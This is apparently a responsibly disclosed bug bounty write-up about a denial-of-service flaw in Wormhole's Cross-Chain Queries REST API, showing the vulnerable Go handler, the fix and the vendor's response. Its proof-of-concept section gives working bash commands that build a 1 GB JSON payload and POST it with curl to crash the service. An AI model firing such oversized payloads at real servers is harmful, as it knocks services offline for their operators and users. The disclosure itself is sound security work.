---
weight: 1
title: "Taking down Wormhole's CCQ service through REST API"
date: 2023-10-24
tags: ["Wormhole", "CCQ", "DoS", "immunefi"]
draft: false
author: "fadam"
authorLink: "https://blog.fadam.xyz/"
description: "Taking down Wormhole's CCQ service through REST API."
images: []
categories: ["Web2"]
lightgallery: true
resources:
  - name: "featured-image-preview"
    src: "templatewormhole.png"

toc:
  auto: false
---

<!--more-->

## 1. Introduction

As part of my Bug Bounty journey, I like to monitor my favorite programs on Github. Checking their latest Pull Requests/commits allow me to know what they are working on, and to get an insight of where security issues could arise. \
In this article, I will describe how I was able to find an issue within a new product (CCQ) of Wormhole. \
Because I was monitoring the project closely, I found the issue soon after it was pushed on the main branch, and before it was pushed on the Guardians nodes. \
The following sections are taken from the Immunefi report. I would like to thank the Wormhole's team for allowing me to post and for their professionalism.

## 2. Bug Description

The tests were performed on the commit: [6c3ff43d6a416abce680e77ce81a9f613ba27075](https://github.com/wormhole-foundation/wormhole/commit/6c3ff43d6a416abce680e77ce81a9f613ba27075) \
Wormhole has implemented a new feature: [Cross-Chain Queries](https://github.com/wormhole-foundation/wormhole/blob/main/whitepapers/0013_ccq.md) which includes a REST API :

> a separate REST server is being provided to accept off-chain query requests

Also the feature is designed to work off-chain only (p2p, API) in the initial deployment:

> The initial release of CCQ will not support on chain requests.

There are two issues regarding the REST API.
The function handleQuery() within [http.go](https://github.com/wormhole-foundation/wormhole/blob/6c3ff43d6a416abce680e77ce81a9f613ba27075/node/cmd/ccq/http.go#L40) :

1. Checks authentication **after** decoding the payload:

```golang
var q queryRequest
err := json.NewDecoder(r.Body).Decode(&q)
(...)
apiKey, exists := r.Header["X-Api-Key"]
if !exists || len(apiKey) != 1 {
	s.logger.Debug("received a request without an api key", zap.Stringer("url", r.URL), zap.Error(err))
	http.Error(w, "api key is missing", http.StatusBadRequest)
	return
}
```

2. Does **not limit the size** of the POST payload.

In consequence, an attacker can craft an arbitrary curl request containing 1Gb of hexadecimal payload.
This will cause the server to decode the body for a very long time, leading to very high increase in RAM, and increase of CPU.
On my testbed, it led to container restarting due to lack of resources.

## 3. POC

First of all, we need to recreate a little Wormhole environment with Tilt.

```bash
git clone https://github.com/wormhole-foundation/wormhole/
cd wormhole
make node
minikube start --cpus=8 --memory=24G --disk-size=100G --driver=docker
tilt up
```

Then we need to modify the Tilt file so we can access the CCQ feature, please refer to the following [Tilt file](https://gist.github.com/0xfadam/4ba10f032d3d2530f5f28556285248a6)

To create the 1 Gb payload that will crash the service :

```bash
echo -ne '{"data" : "' >> json_payload.json
dd if=/dev/urandom bs=1M count=1024| xxd -p -c 1024 >> json_payload.json
echo -ne '"}' >> json_payload.json
tr -d "\n" <  json_payload.json > final_payload.json
rm  json_payload.json
```

To perform the attack :

```bash
curl -X POST -H "Content-Type: application/json" -T final_payload.json http://guardian:8996/v1/query
```

A video PoC (with 2 videos) demonstrates the impact:

1. https://drive.google.com/file/d/1vvzbUr-ucuVWthf7K57eiiHGFoqf9x-O/view?usp=sharing
2. https://drive.google.com/file/d/1vwDj27H4Y97vbOMvzJVzKxgdbz08mNzz/view?usp=sharing

The PoC is running on a I7 server (16CPU) + 32 Gb RAM, and only one curl is used. \
On the second video, at 5.22, the server reaches maximum RAM and container restarts.

Only 2/3 requests were used. The purpose of using a small amount of requests was to demonstrate that the issue was not **network-related** , but **application-related**.

## 4. Recommendation

1. The first part of the fix is to check the authentication before processing the JSON payload.

```golang
	// There should be one and only one API key in the header.
	apiKeys, exists := r.Header["X-Api-Key"]
(...)
	var q queryRequest
	err := json.NewDecoder(http.MaxBytesReader(w, r.Body, MAX_BODY_SIZE)).Decode(&q)
	if err != nil {
		s.logger.Debug("failed to decode body", zap.Error(err))
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
```

2. Additionnally, a control over the payload size is now performed, ensuring it does not exceed 5Mb.

```golang
const MAX_BODY_SIZE = 5 * 1024 * 1024
(...)
err := json.NewDecoder(http.MaxBytesReader(w, r.Body, MAX_BODY_SIZE)).Decode(&q)
```

## 5. Wormhole response

CCQ service exists outside of the Guardians, on different servers. \
This is by design to ensure minimal running services are on the node that contains the guardian signing and identity (p2p) keys. \
Therefore, impacting CCQ could have not caused a Denial of Service on the Guardians. \
Also, it is expected that Guardians operators will protect the CCQ feature behind a reverse-proxy and other security equipments.

With that being said, Wormhole has been very proactive and has fixed the issue **on the same day** of the report, through the [PR 3443](https://github.com/wormhole-foundation/wormhole/pull/3443).
